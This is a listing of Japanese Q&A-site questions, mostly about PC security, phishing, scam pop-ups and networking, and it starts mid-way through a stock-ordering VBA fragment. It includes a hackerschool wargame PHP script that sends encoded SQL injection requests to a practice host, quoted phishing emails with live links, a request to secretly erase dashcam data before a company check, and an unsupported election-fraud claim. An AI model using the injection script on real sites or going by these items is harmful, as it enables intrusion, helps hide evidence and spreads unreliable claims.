口座区分：特定 '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop objIE.Document.forms(1).Submit ' 確認画面へ '表示待ち Do While objIE.Busy = True DoEvents Loop Do While objIE.Document.readyState <> "complete" DoEvents Loop objIE.Document.forms(2).Submit ' 発注 End sub
共通データベースの格納場所を複数のハードディスクに分散させるだけでは、障害を起こしたディスクのデータは消えてしまう。 だから障害が発生したときも、中断することなく業務を続行できる方策としては適していない。 という解説を読んだんですが、複数のハードディスクに分散しているのに、なぜ障害が起きるとディスクのデータが消える、と言い切ってるのでしょうか？複数だから、一部残るんじゃないですか？共通データベースの格納場所を複数のハードディスクに分散させるだけでは、障害を起こしたディスクのデータは消えてしまう。 だから障害が発生したときも、中断することなく業務を続行できる方策としては適していない。 という解説を読んだんですが、複数のハードディスクに分散しているのに、なぜ障害が起きるとディスクのデータが消える、と言い切ってるのでしょうか？複数だから、一部残るんじゃないですか？
私、36歳。相手の女性25歳。今週の土曜日に愛知県半田市にある、シャンドールというパフェが有名なお店に車で行くことになりました。 今の季節、桃のパフェが食べたいということで、前から連れてって欲しいと言われてました。 ネットで確認すると、シャンドールというお店は予約は出来ないし、2時間くらい待たなければいけないと書いてありました。 半田付近でどこか時間つぶせるような所はありませんか？
ネットワーク構築のパズルです。 所有している機材を組み合わせてネットワークの勉強をしているのですが、色々やり過ぎて混乱しております。下記機材とVLANを駆使して「セキュリティーが高い」「メンテナンス性が良い」「効率的な通信」などを考慮し、実際の現場でも通用するようなネットワークを構築してみたいのです。 -------------------------------------------- ルーター：YAMAHA NVR500 ファイアウォール：Fortigate 60C L2スイッチ：YAMAHA SWX2200-8G L2スイッチ：NETGEAR GS116E 無線AP：Buffalo WAPS-AG300H 外部DNS・WEB兼用サーバ（LINUX） 内部DNS・DHCP兼用サーバ（LINUX） ファイルサーバ（FreeNAS） デスクトップPC ノートPC スマホ・タブレットなど -------------------------------------------- 想定している条件としては、 1.外部からIPSecで全てのクライアントに接続できること 2.客人用の無線セグメントを用意して、サーバ類には接続できなくする 3.ファイアウォールポリシーなどはセグメント単位で簡単に実施したい 4.通信時に各機械にかかる負担をできるだけ抑えたい 5.可能であれば、ひかり電話も使いたい（無くても可） です。 全ての機械を使う必要はありません。 皆さんならどうしますか？
柴犬のエサで、ネットにホームセンターのは絶対駄目と書いてありましたが、やはり安いのは良くないの？
自宅内での子機の通話って、親機に比べて簡単に他人が盗聴できたりするんですか？
mp3のデータ内に個人情報が入り込んでしまうことはあるのか？つくった曲をネットにupしようと思うのですが （アップローダーにあげ、ダウンロードできるようにする） mp3のデータ内に自分のPcの情報が入り込んでいるのか 気になっております。 「情報を見る」を見てみると、共有とアクセス権のところに ユーザーネームが入っております。 これは他のPcで見た時にはそのPcのユーザーネームが 入るのでしょうか？ macです。
MBSAのパッチを一括で適用したいです。 MBSAのパッチを一括で適用したいのですが方法がわかりません。調べてもわかりづらいのばかり。わかりやすく教えてください！！
どうしましょう。ネットが開けません！
GALAXYのＳ７使ってるんですけど、ほんとしょっちゅう｢あなたのスマートフォンはウイルスに感染しています、このぺージを閉じた場合は自己責任です、解決のためにはこちら、あと〇分〇〇秒｣って警告文が出てくるんです。 それで、こちら、ってとこをタップ？したらGoogleストアのアプリが出てきて...。Nortonでは問題なし、って出てきたんですが。。 姉には｢これがウイルスじゃないの笑｣と言われたんですが笑笑 本当に感染しているんでしょうか？？ スクリーンショットでも撮っとけば良かったんでしょうが......。 詳しい方、アドバイス？お願いします！！
暗号なのですが 610 23 61 、 66 94 ー 68。 611 37 32 86 103 61、 92 69 95 46。 というものです。アルファベットでもひらがなでもないので苦戦しています。分かった方はぜひ教えてください。お願いします!!
遠隔操作ウイルスでしょうか？解決策を教えてください。友達に動画を送りたくて、動画の形式を書き換えるフリーソフトをいくつかインストールしたためウイルスをもらってしまったと思います。 PCについて詳しくないので間違ってることもあるかと思いますが、症状などを書いていきます。 ①googleのタブが大量に開く(そのままフリーズしてしまう程) ②PC起動してパスワード入力の画面で何も押していないのに、「パスワードが違います」と表示される(パスワードを何度か試されてる気がする) ③PC起動ロゴ画面で止まる(起動画面でF2を押して初期化に挑むも変なエラー表示が高速で出たり消えたしてフリーズ)←このときは無線LANを接続していた ④無線LANを根本から切るとやっと自分で操作できるようになったので、設定から初期化(出荷状態に戻す)を選択しました。焦っていたのでウイルスの原因のソフトがわからぬまま初期化中←今ここです 出荷状態に戻ってもウイルスがあるかどうかはわからないかもしれないですが、再感染するウイルスだった場合業者さんに頼むことはできますか？買い替えになりますか？ 無線LANに感染していたら家族のパソコンにも移りますか？ 説明不足なところもあるかと思いますが、回答お願いします。
NECのLA VIEで Windows７を使ってるものです。今朝突然、パスワードをいれてもログインできなくなりました。F8連打で、セーフモードで立ち上げてもパスワードをきいてきて、いれてもログイン失敗。NECのサポートに電話したら、初期化しか方法はないだろう」といわれました。 ネットでしらべるとUSBにいれられるパスワード破りできるフリーソフトがあるようなのですがいまいち誰がつくったのか不安です。。 同様な症状で解決されたかた、初期化する以外に方法はないのでしょうか。 ご指南ください。 そもそも6月の2度のアップデートをマニュアルでしようと思ったのに、ダウンロードがいつまでたってもはじまらなかった、結局インストールできなかったというのが顛末です。 思うに、復元する画面までいけば、直近復元ポイントで回復するか試せると思うのですが。。 どうでしょう。 アドバイスください。
アマゾンからこんなメールが来たのですが、身に覚えがなく困ってます。 どうしたらよいのでしょうか？ 本日20時に配達致しますのでよろしくお願いします。 ご注文品 こだわり栽培バナナフィリピン産 40本 3920円 MONSTER エナジー 無糖 2ケース 7920円 SONNY洗濯機 ドラム式 1台 228000円 合計239840円 ↓注文内容確認はコチラ↓ http://xrgg.nf6hzrdhj.biz/QsIuS6561Ad4D/w096d0d8c/m91Nz1jeZo5z/gfb1... ↓キャンセル等お問い合わせはこちら↓ http://xrgg.nf6hzrdhj.biz/LSe167242C/ZIrvY42b7c584/11fJzX/OTiGaBD8f... Amozon.com
MACのテキストエディットで制作したベージをHTMlにてweb上に乗せることは危険になりますか。 ユーザー名などがURLに出たりします。
すいをそぬにてのこの暗号といてください 並べ替えるとでてくるとおもうんですが
一般的な会社のネットセキュリティについて教えて下さい。 たとえば、会社PCで個人のGmailにログインした場合それはばれることがあるのでしょうか。 また、ばれるとしたらなにか問題が起きたさいに過去の履歴をさかのぼった結果、副次的にばれる、ということでしょうか。 であれば、ログインした履歴がばれるだけで、その中身はばれない、ということでしょうか？ まあ何がいいたいかって、会社PCでクロムのシークレットモードでGmailログイン、メール作成画面で個人的なメールを書いて保存、個人携帯からログインして送信だけするみたいなことをすることがあります。 やっぱりパソコンのが楽なので、、、仕事中にやってるわけじゃないですよ。 これなら暗号化されてるし、そもそも送信はしていない(ネット上に発信したことにならない)ので大丈夫かな？って思ってるんですが、実際セキュリティに携わっているかた、どのへんまで管理されているか教えて頂けますでしょうか。 想定される解答としては ・作成した内容まで全てばれてる。なんならパスワードもばれてる ・個人Gmailにログインしたってとこまでばれてるが、内容まではみれてない ・そもそもシークレットモードでみてるなら、通常わからない。なにかあったときに副次的にばれるかも。 こんなところかなと思いますが、宜しくお願いします。
JRE、JDKのゼロデイアタックが問題になり削除する人が増えているようですが、 遠くの両親のPCから削除したほうが良いでしょうか？いつも管理ができないので、危険かなと思っています。 ただワード、エクセルインターネットサーフィンくらいですが、アプリが使えなくなるとまずいので、 それくらいのユーザーならまず問題は起きないと考えてよいでしょうか？ 当方はWEBサイト制作の仕事でgulpなどを使っているので、さすがに削除はやめたほうが良いですよね。 上記二つはjavaで作られたアプリを使う場合のみ問題が起きその多言語で作られたアプリしか使っていない人は削除できると考えてよいでしょうか？
ウィルス対策はウインドウズ７に最初から入ってたwindows defenderだけで十分ですか？ 前はウイルスバスター使ってたが重いので使ってません
このカメラの名称は何ですか？ オービスですか？
この前、ピクシブにログインして 小説や絵を見ながら、別のタブを開いて色々なまとめサイトを見てたんですけど あるまとめサイトをクリックしたら「これは安全でないことが報告されている Web サイトです」という 色々書いてある警告文が出てきたんですが ピクシブのパスワードやパソコンの個人情報などが漏れたりはしないですよね？ かなり不安です
ネットを見ていたらブラウザでお使いのスマートフォンがウイルスに感染しました。と表示されアプリのインストールを促されました。いわれるままセキュリティーアプリ？のようなものをインストールしたのですが大丈夫ですか？
例えばあるwifiを使って犯罪予告をしたとします。すると警察はこのwifiの情報を調べて犯人を特定すると思いますが、このとき 警察は犯人の使っている端末についてどの程度調べ上げることができるのでしょうか？ つまりこの端末が過去に他のどんなwifiや回線につながっていたかまでわかるのでしょうか？（犯人の端末を直接押収する前の話です）
僕の名前は「樹（いつき）」で自分のハンドルネームを考えたんですけど思いつかなくて…いつもネットで使う名前は「ITSUKI」にしているのですが、これだと名前がバレるので嫌なんです。 なので僕のハンドルネームを考えて下さい。 お願いします！！
今日からONE PIECEの映画の座席指定できたので急いで行ってきたら エグゼクティブシート１つ以外 全部売り切れ。 私が行った時間は11時半くらい！ AEONの映画館は多分9時か10時くらいやろ？ なんでそんなすぐ売り切れるの ︎ ネットで頼めるんですか ︎ てか３日前じゃないと座席指定 できないんじゃないの ︎ もしネットで座席指定できるなら 教えてください！
iphoneのバックアップについての質問のです。itunesを用いてiphoneのバックアップをとりたいのですが毎回、 「容量が不足している」 のようなメッセージが出てきてバックアップが出来ません。 しかし実際、パソコンの空き容量は250GB近くあり全体の60％近くを占めています。 原因として心当たりがあるのですが、 バックアップをとっている最中にセキュリティソフトのsophosが、 脅威が検出されました、 となります Troj/JSDldr-FO mal/DrodZp-A 上のようなファイルがいくつか出てきてその他にも２，３個のファイルが検出されます。また、そのファイルの場所を確認すると ローカルディスク > ユーザー > appdata > roaming > apple computer > mobilesync > backup > 0f1547a64025d618b662587bfd2357321e9f35c4 > snapshot というようになっています。 もしかしてこれは自分のiphoneがウイルスに感染していると言うことなのでしょうか？ 脱獄などしていないのであり得ないとは思うのですが... いったいどうすればバックアップがとれるのか、 あの検出されたファイルはなんなのか、 自分のiPhoneは無事なのか... 解決策、アドバイス等良ければ教えてください。 （（（文章が読みづらく、説明が下手で申し訳ありません...）））
共通鍵暗号について 鍵の配布は簡単でしょうか？難しいのでしょうか？
緊急！！！8946でtake24 http://www.hackerschool.jp/hack/take24.php この問題の解説を読んでphpを書いてみたんですがどうもゴール目前で止まってしまいました。 そこで、このphpのどこが悪いのか教えてください。 あとコメントアウトが必要な部分も教えてください。お願いします。 その問題のphpっていうのがこちらです。 <?php set_time_limit(0); $ary[] = 3; $ary[] = 6; $ary[] = 8; $ary[] = 16; $ary[] = 18; $ary[] = 27; $ary[] = 28; $ary[] = 31; $ary[] = 33; $ary[] = 35; $ary[] = 39; $ary[] = 43; $ary[] = 47; $ary[] = 49; $ary[] = 52; $ary[] = 53; $ary[] = 59; $ary[] = 62; $ary[] = 63; $ary[] = 64; $ary[] = 66; $ary[] = 67; $ary[] = 68; $ary[] = 75; $ary[] = 77; $ary[] = 79; $ary[] = 86; $ary[] = 89; $ary[] = 91; $ary[] = 94; $ary[] = 95; $ary[] = 97; $ary[] = 101; $ary[] = 102; $ary[] = 103; $ary[] = 105; $ary[] = 124; $ary[] = 130; $ary[] = 131; $ary[] = 132; $ary[] = 134; $ary[] = 136; $ary[] = 142; $ary[] = 145; $ary[] = 155; $ary[] = 156; $ary[] = 158; $ary[] = 163; $ary[] = 164; $ary[] = 167; $ary[] = 168; $ary[] = 169; $ary[] = 171; $ary[] = 175; $ary[] = 176; $ary[] = 177; $ary[] = 182; $ary[] = 187; $ary[] = 194; $ary[] = 195; $ary[] = 197; $ary[] = 200; $ary[] = 208; $ary[] = 210; $ary[] = 213; $ary[] = 214; $ary[] = 218; $ary[] = 219; $ary[] = 222; $ary[] = 223; $ary[] = 224; $ary[] = 226; $ary[] = 234; $ary[] = 238; $ary[] = 262; $ary[] = 270; $ary[] = 271; $ary[] = 272; $ary[] = 280; $ary[] = 282; $ary[] = 283; $ary[] = 284; $ary[] = 285; $ary[] = 286; $ary[] = 289; $ary[] = 290; $ary[] = 293; $ary[] = 295; $ary[] = 299; $ary[] = 300; $ary[] = 301; $ary[] = 308; $ary[] = 309; $ary[] = 310; $ary[] = 316; $ary[] = 319; $ary[] = 321; $ary[] = 322; $ary[] = 331; $ary[] = 333; for($i=0;$i<100;$i++){ $insert_sql = "INSERT INTO history (member_id,book_id,date) VALUES ('151',".$ary[$i].",UNIX_TIMESTAMP(NOW()))"; $rot47sql = str_rot47($insert_sql); $sql[$i] = url_to_encode($rot47sql); } for($i=0;$i<100;$i++){ $url = 'http://whitecafe.moe.hm/public_html/books.php?sql='.$sql[$i]; $headers = array( 'Referer: http://whitecafe.moe.hm/public_html/books.php' ); $options = array('http' => array( 'method' => 'GET', 'header' => implode("\r\n", $headers), )); $check = file_get_contents($url,false,stream_context_create($options)); if($check){ echo"
OK:".$i."回目"; } } print_r($sql); $pass = "hNupNRhY"; $password = sha256Stretch($pass); $sql = "SELECT book_id,from_unixtime(date) ,scrap FROM books WHERE scrap = 0 and date <UNIX_TIMESTAMP(NOW()) LIMIT 100;"; $rot47 = str_rot47($sql); url_to_encode($rot47); function sha256Stretch($password) { $key = $password; for ($i = 0; $i < 10000; $i++) { $key = hash('sha256', $key); } return $key; } function url_to_encode($a){ $conv = urlencode($a); print $conv; } function url_to_decode($a){ $de_conv = urldecode($a); return $de_conv; } function str_rot47($str){ return strtr($str, '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~', 'PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO'); } ?>
このウインドウ、よくでてくるのですが、操作の邪魔になっていて・・・ 出てこないよう設定することはできないでしょうか？
AES暗号に関する質問です。 AESのS-boxが盗聴者に知られた場合、解読されることはあるのでしょうか？このとき、共有鍵は盗聴者に知られていないものとします。 AESに関してよく知らないため、的外れな質問かもしれませんが、 御回答をよろしくお願いします。
大きいシステムってなんですか？ 銀行システム、保険システム、流通システム、ヤフー、グーグル、医療システム、証券システム、製造業システム。などなどいろ
よく私は可愛いですかとかかっこいいですかと自分の写真を乗っけていますがネットに顔写真を投稿するって危なないのでしょうか？
私はiPhone5sを持っていたのですが、そのiPhone5sがつい最近故障してしまいしまた。 それに怒った親が私の携帯を解約してしまいした。 他の端末からtwitterに ログインしようとしたのですが ログイン認証というものをしてしまって ログインできません。 ログイン認証の番号は携帯番号に 送られるのですが、 携帯番号は解約されているので、 見ることができません。 どうしたらtwitterにログインすることが できるでしょうか？ もう無理なのでしょうか？ 文章下手くそですみません。
助けてください会社でドライブレコーダーの抜き打ちチェックにあいました。中のmicroSDのデータを削除してドライブレコーダーにmicroSDを差すとフォーマットしてくださいとなり、フォーマットしてしようすると中にフルフルのデータが入ってしまいます。 本体で保存してて、フォーマットのタイミングでmicroSDへ書き込みにいくとかあるのでしょうか？ バレずに中身を消したいです。 心からお願いしますm(__)m
こんなに待てません。解除する方法は他にありませんか？ よろしくお願いしますm(__)m
出来るだけ早く回答して頂けますとありがたいです！ 旧イーモバイルのgl10pの機種でPINコードの認証があと1回なのですが、 回数をリセットする方法はありますか？
最近？ネットでのコピペができにくくなったと思いませんか？例えばある人物のブログなど～一部分コピペしたいと思ってもできない？以前歌詞などはダメだったのですが拡散してませんか？
至急お願いします。写真をはったんですけどこれはどうゆうことですか？早く回答お願いします
カスペルスキーをパソコンに入れてからゲームが出来なくなってしましました。 そのゲームはエイジオブエンパイアコンカラーです。 立ち上がりもしないです。パソコンに疎くセキュリティーだけはしっかりをと思い 購入したものでまだ２年以上ライセンスも残っていますのでどうしたものかと。 ネットで見ているとその時だけセキュリティーソフトを停止すればとありましたが 怖くて出来ません。よろしくお願いします。
至急お願いします。いつものようにネットを見ていたら、２つウィルスに感染しているという内容のものが出てきました。 ５分以内にアプリをインストールし、最低３日間はそのアプリをアンインストールしないようにということが書かれていました。タイマーのようなものも表示されていました。 戻ろうとしたのですが、警告が出て、戻るのは自己責任だと言われました。 変なサイトは見た覚えがありません。 そのとき、私は星座占いのサイトを見ていました。 また、確認しようと思ってタブを開いたのですが、残っていませんでした。 もう５分は過ぎたのですが、そのアプリをインストールした方が良かったのでしょうか？ ちなみに過去にも１度ありましたが、今まで特に何もなく使用していました。
先程、こういうアドレスからリンクURLつきでメールが来ました。 先日、ソフトバンクでウイルス付きアプリのことで手続きをして来ました(過去質問を見てください) ショップでは、ソフトバンクのメールに成り済ましたメールに注意するように言われました。 このメールはなんなんでしょうか？ 怖いのでどなたか回答おねがいします。 staff_survey@maill.my.softbank.jp Request for cooperation in a survey（No charge for receiving this message） 2016/08/02 09:03:26 From SoftBank Corp. Thank you for visiting our store. We would appreciate your participation in our survey in order to improve our service. ●The survey https://summer.sbb-sys.info/enge/102002/lang-en/token/bmgimpce86phs... *SoftBank3G handset(Released before 2011) may be unable to display the survey. ●Regarding transmission costs and the use of response information. ・There are no charges for receiving this message (within Japan). ・Transmitting survey responses will be charged for iPhone/smartphone users(Flat-rate Data Plan covers the charge),and there are no transmission charges for users of other mobile phone devices (within Japan). ・Please be aware that normal transmission charges will apply when receiving this message and transmitting your survey responses from overseas. ・Your answers and comments will be analyzed for marketing purposes,and will be provided to our agents (including the staff member who helped you) for this purpose only. It is our sincere hope that we can continue to offer you the services of SoftBank. ●Call 157 for any suggestions/questions/feedback about this email [9:00 AM-8:00 PM]
いつも通りネットをいじっていたら、何もしていないのにウェブ利用制限が出て、今まで見れたサイトが突然見れなくなってしまいました。この場合はどうすれば良いのでしょうか？
Gmailに関しての質問です。iphoneのGmailアプリからいつもメールのやりとりをしているのですが、位置情報設定のオフのやり方がわからず困っています。 メールを送る相手にどこの国(又は場所)にいるのか知られたくないのですが、特に何も設定を変えなくても知られる事はないのでしょうか？ ご回答よろしくお願い致します。
ファクトリーリセット(強制初期化)のやり方を教えて下さい。機種はAQUOS PHONE SH07Eです。お願いします。
生体認証制度について 会社のセキュリティ対策(入退室用等)として、社員に指紋や静脈等の生体情報の登録を求めた場合、社員が拒否できる法的根拠はありますか？
他の人が作った、ホームページ、ブログ、サイトにアクセスした人のIPアドレスを製作者とは関係のない人が取得する事は可能ですか？
どれくらいの素顔をネットに乗せたら住所など個人的なことを特定されますか？例えば ・眼鏡、マスクなどのアクセサリーつけてる ・上、下など撮影位置 ・太陽、逆光 …などで見えにくくなってる場合です。
iPhone6sをつかっていますセキュリティ質問を忘れて課金できません ネットで調べましたが、ネットの方法ではできませんでした。 わかる方、詳しく説明お願いします！
EXOとかのK-POPアプリ？のWe date+を入れたのですが、英語と中国語でわからないし、パスワードを入れてもダメとでるしget a testcodeというのでやっても中国語で失敗と出てしまいます。どうやってログインするのですか？
Ipodtouch5を使っていて、思い出の写真をたくさん保存しています。もし突然壊れてしまった時、データが全部消えてしまうかもしれないかと心配です。パスワードなどを決め、別の端末になっても写真を見る事ができる(保管できる)アプリやサイト、方法はありませんか？知っている方、教えて下さい。お願いします。
ネットのウイルス（詐欺のページ）などについての質問です。とあるアニメで、「オンラインゲームに主人公がログインしようとして、一度IDとパスワードが弾かれて、主人公は入力ミスをしたかなと思って、再入力した。→そのパスワード等が乗っ取られた」という内容の回がありました。 アニメでは、別アカウントを取って、運営に働きかけ解消していました。 このような、入力して弾かれてパスワード等が盗まれるということはあるのでしょうか。 先ほど、スマホで似たような現象※になり、調べるにも調べるためのワードが分からなくて困っております。 対処をすべきかしなくてもいいべきか。 するなら、どのような対処か。 この辺りをお教えいただけないでしょうか。 ※詳細は以下になります。 おとといの話。 →WEBでほしいグッズの検索をしていて、あるサイトにアクセス(今までアクセスしたことのないサイト)にアクセスしたら、突然POPアップで「あなたのスマホは２つのウイルスに感染しています」的な文言と、そのPOPアップの後ろに5分間のカウントダウンがありました。 この場では、焦って何かしたら詐欺サイトか何かに引っかかると思って、そのまま画面を閉じました。 昨日の話 →ヤフオクで商品を落札しました。 かんたん取引ではない、旧の取引です。スマホで取引してました。 かんたん決済で、支払いをしようと、通常通りの「かんたん決済支払いへ」を選択し、いつも通りの「パスワード等の再確認の画面」が立ち上がりました。 いつも通り入力後、「ログイン」を押しました。 すると、見たことのあるようなないような感じの緑系のカードローンか何か(詳細覚えていなく、スクショも撮らず)のページ【謎のページとします】に飛びました。 入力を間違えたor変なところを押したかと思い、焦って戻って再入力し、ログインすると、普通に入れたので決済しました。 そのあと、よくよく考えると、パスワード等の再確認の画面には1つのリンクを除いて外部リンクがないのを思い出したので、どことなく不安に感じました。 1つのリンクは、のちに見ましたが、謎のページではありませんでした。 そのあとに、初めてウイルスバスター的なアプリをダウンロードしてスキャンし、異常なしで、 ヤフオクは、パスワードを変えました。 かんたん決済には、クレジットカードの入力画面があります。 クレジットカードは、データが予め入力されており、裏面の数字は毎度入力する形ではありますが、 もしデータが抜き取られていたらと思うと不安です。 何かわかる方や、考えられることがわかる方がおられましたらお教えいただけますでしょうか。 検索するにもどこをどう検索したらよいか、分からなかったので、この場にてご質問させていただきました。 長々と申し訳ございませんが、どうか宜しくお願い致します。
LINEで友達の非表示リストについて質問です。 非表示リストを編集で再表示したら、相手に通知が行きますか？？
初めての質問になりますが、どうかよろしくお願いします。 実はかねてより会社の方からマイナンバー事業への参入企画書を提出するように言われています。しかしネットなどで検索すると税金の公平な徴収のためのものであると書かれているので、実際に事業への参入と言われてもはたして本当に参入できるのか、どんな事業ができるのか何も検討すら付きません。 wakadanna_kazusaya様は他の方への回答の中でビジネスチャンスと書かれていましたので、もしかしたら何かすでに実行に移されているのかと思いワラをも掴む気持ちで質問させて頂いた次第です。 実際問題として、民間企業がマイナンバーに関わることが可能なのでしょうか？ 可能であればどのような事業になるのでしょうか？ 貴社の企業秘密に近い質問であることも、このような質問を質問をしながらIDを伏せているのがはなはだ失礼である事も十分に承知しています。 ご回答を頂けないかもしれませんが、何かヒントになるような事だけでもお教え頂くわけには行きませんでしょうか。 まことに勝手であつかましいお願いでしょうが、何卒よろしくお願い致します。
モンハン4Gが今ネット繋がりません。 メンテナンスですか？
PCのネットワークに接続していないはずの携帯電話のアイコンが表示されました。 すぐ消えてしまったのですがなんだか怖いです。（ハッキングされてないかとか・・・） 詳細はわかりませんが「Lenovo_TAB2_501LV」という表示がしてありました。 どなたかわかる方がいらっしゃいましたら、 これはどういう状態なのか、また今後どう対応したらよいか教えてください。
本屋で売られてる漫画をネットで無料でダウンロードするのは法的、モラル的どちらも違法なのですか？ 色々調べたのですがわかりません...テンプレの回答はもう見てるのでお控えください。
SSL通信の仕組みについて教えてください。 駆け出しのITエンジニアです。 この度従事することになった現場で、SSLについて理解しておく必要があるため勉強中です。基本的なことかもしれませんが以下の疑問点にご回答いただけますでしょうか。 1.クライアントとは認証、クライアントの証明書が有効期限内であるかどうかを確認しているものだと認識してますが、サーバー認証（検証？）とは何を見ているのでしょうか？また、有効期限が切れたものは接続できなくなると思っていますが、サーバー証明書の認証（検証？）に失敗しても接続できなくなるということでしょうか？ 2.証明書にはSHA1とSHA2の二種類があると見ましたが具体的に何が違うのでしょうか？ 3.SSL通信で用いられる証明書はクライアント証明書、サーバー証明書、ルート証明書、中間証明書であると認識していますが、それぞれの用途というか目的について教えてください。 4.SHA1のクライアントがSHA2のサーバーにアクセスすることは可能なのでしょうか。また、その逆のパターンはどうなるのでしょうか。 先輩の話を聞いても全く付いていけず、ネットで調べても理解が追いつかないので諸先輩方に知恵を貸していただきたく… 宜しくお願い致します。
MWリマスターが出るのでMW以降のCoDランキング作ってみました MW>BO≧MW2>BO2>BO3>MW3≧AW>G 私はAW以降はやってない為、ネットでの評価を見て決めたところがあります。 なのでこれはここじゃ無いと思う所は意見ください
コンパイラについて質問です レジスタを多く持つコンピュータは一般に良いコードを生成しやすい。 とよく聞くし、頭の中ではわかっているのですが、その正確な理由がわかりません。 ご教授願えたら幸いです。 よろしくお願いします。
Googleアカウントの不正ログインについて 先程gmailで新しい端末からログインされたという通知が来ました。私が操作したものではなかったので不正ログインだと思われます。 すぐにパスワードを変えたのですが、後から確認すると一週間程前にも別の端末からログインされていました。。。 名前や携帯のメールアドレス、ログインする際に確認する携帯電話番号など、googleのアカウント情報がすべて漏れてしまった可能性があります。 また、家族で共有していたアカウントで、家族のスマホのフォトが自動バックアップ設定になっており、家族の撮った写真も漏れてしまったと考えられます。 パスワードを変える、2段階認証をする、など今後漏れないようにするための行動はできますが、漏れてしまった情報は変えようがありません… こういった時、何から手をつけるべきでしょうか？ 同じような経験のある方がおられたらご教授ください。 ※gmailはスマホでの利用が主です ※クレジットカードの登録はしておりませんでしたので、課金されるなどの心配はありません ※Amazonや楽天などの通販サイトで設定してあるメールアドレスは別のものでしたのでこちらも心配なさそうです
これは、監視カメラなのでしょうか 詳しい方お願いします
次の問題を解いてくれませんか？ IPアドレス133.80.0.0/19で表されるネットワークはいくつのホストに対するアドレスを持つか？
【50代中卒無職・元現業職公務員です】 困窮を極める生活と職のない心細さで、ここで公務員を罵倒するのをわずかな心の慰めにしてきました。しかし、YahooのIDから、個人が特定されて、実名など晒されるかも知れないとある人に言れました。そんなことが技術的に可能でしょうか。
情報科学者が今取り組むべき課題は何だと思いますか？
車のインテリジェントキーの修復モードに入る操作方法がわかりません。機種 AODELIN製 ADL-168 英文原文 Repair mode 1 After removing the operation of solution of anti and the vehicle in OFF state, while long pressing Function setting key for 3 seconds will go into the repair mode, repeat above operation will be out of repair mode. Into the repair mode, the speaker ring twice for tips, out of repair mode, the speaker has beep once for tips 翻訳文 1. 修復モード：動かない状態と停止状態の車の解決の操作が済んだあと、ファンクションセッティングのキーを3秒長押しすると、修復モードになります。繰り返す(再び3秒長押しする) と修復モードから抜けます。 修復モードに入ると、スピーカーがベルを２回鳴って教えてくれます。修復モードから抜けるとスピーカーからブザーが１回鳴って教えてくれます。 Q 修復モードに入る事ができません、After removing the operation of solution of anti and the vehicle in OFF state,（動かない状態と停止状態の車の解決の操作が済んだあと）この部分は何かの操作の後、もしくは何かしながら、で、while long pressing Function setting key for 3 seconds は、一緒にを3秒間ファンクションキーを長押しだと思うのですが、違う解釈か翻訳にはなりませんでしょうか？ 宜しくお願いいたします。
ドラマを見ようと、KissAsianというサイトを開いていたら、Windowsセキュリティー＆アンチウィルスサービスでエラーが発生しました、との表示がされ、◯◯にお問い合わせくださいという番号が出ました。電話してみると、365TechAidという会社につながり、Techviewerの遠隔操作のページから遠隔操作をしてもらう形になりました。そして、1年間の補償を申し込むために23000円ほどの振り込みを要請されて、口座番号を聞かれました。 不安になりネットで見てみると、Teamviewerをダウンロードさせて情報を奪う詐欺などがあるとあり、心配になったので一旦電話を切り検討することにしました。 これは安全性に問題はないのでしょうか？
Androidで分割されたパスワード付きrarファイルの解凍方法を探しています。 chiebukuro.yahoo.co.jp/detail/q1291451987 chiebukuro.yahoo.co.jp/detail/q12141727567 これらの質問の回答にあるアプリを導入してみたのですが、複数のrarファイルを選択する方法がわからず困っております。 上記のアプリの使用方法、もしくは別のアプリとその使い方を教えて頂けると助かります。
僕のグーグルアカウントに不審なアクティビティが検出されたと通知があったのでアカウントのパスワードを変えたんですがこれで大丈夫なんでしょうか？
スマートフォンの画面ロックは何にすべきでしょうか？(android5.0.2 XperiaZ3 au)パターン、pinコード、パスワードの３種類の中から最もセキュリティが高いのがいいのですが、いかんせん私にはそういった知識がないため、どれが最善策がわかりません。端末を外出先に置いていき、そこそこの間セキュリティが持ってくれればいいのです。道端で拾った携帯の画面ロック解除に何年もかける暇人はいないでしょうし。 パターンは、なんか弱そうな感じします。 ですが、何度も間違えるとGoogleアカウントへのログインが求められるそうで、かのFBIでも破れなかったっていう記録ありますしね、でも、パターンだと画面の指紋の汚れでバレてしまう可能性もありますよね。 pinコードってどうなんでしょう？個人的には数字好きで、意味の無い数列16桁を画面ロックに今してますが、どれ程の信頼性があるのか想像つきません。 パスワードは1番強そうですけど、10桁を超える文字をいちいち打つのも面倒臭いですよね、、 何がいいんでしょうか、教えて下さい知識人の皆様
BNFの問題です。https://www.engineer.or.jp/c_topics/001/attached/attach_1621_6.pdf の問5ですが、消去法で④が正解と思うのですが（実際正解） 理由が分からない状況です。 教えて頂けないでしょうか。お願いします。
この暗号を解いてください！お願いします(>人<;) どういう意味なんでしょうか…？ OR BOK SKND SYR ヒントは無いそうです…
ネットでよく見る釣りってやってて楽しいのですか？あとやって何か得はあるのですか？
ぷるるん女神のらくらくコースを解約したいのですが、初回＋3回分を受け取らなければ解約できないと言われました。 ですが私は体に合わず、返金してもらおうと思っていたのですが、ネットで調べたところ3回目の商品を受け取って4回目の発送7日前まで連絡すれば良いと書いてあったので、連絡したところ4回目を受け取って5回目の発送7日前に連絡してくださいと言われました。 5回目の発送7日前に連絡しても返金してもらえるでしょうか？ 長文で読みづらい文章ですがご回答よろしくお願いします。
わたしの家の敷地にポケモンが生息しているらしく、知らない人が毎日スマホ片手に浸入してきて困っています。#ポケモンGOによる未来の質問
ＥＣショップから、宛先がアドレス宛様で注文ありがとうございましたとのメールが届きました。メール文にある「せろほかふおては」という訳のわからない言葉は一体なんなのでしょうか？すぐ削除しましたが、無視して大丈夫ですよね。
各地域での開票でもさまざまな不思議？(不正？)な事件？が発生してると聞きます。 ★この動画は必見。最強の不正選挙追及者だと思います。全部見ることをお勧めしますが、時間のない方は44分23秒〜54分40秒をご覧ください。 開票トラブルと選挙不正；最強の不正選挙追及者が現れる!?ムサシの不正票集計改竄を暴けば、安倍自民党は完全崩壊（必見！VIDEO「不正選挙」疑惑追及者Ａさんインタビュー） http://mizu8882.blog.fc2.com/blog-entry-1554.html?sp
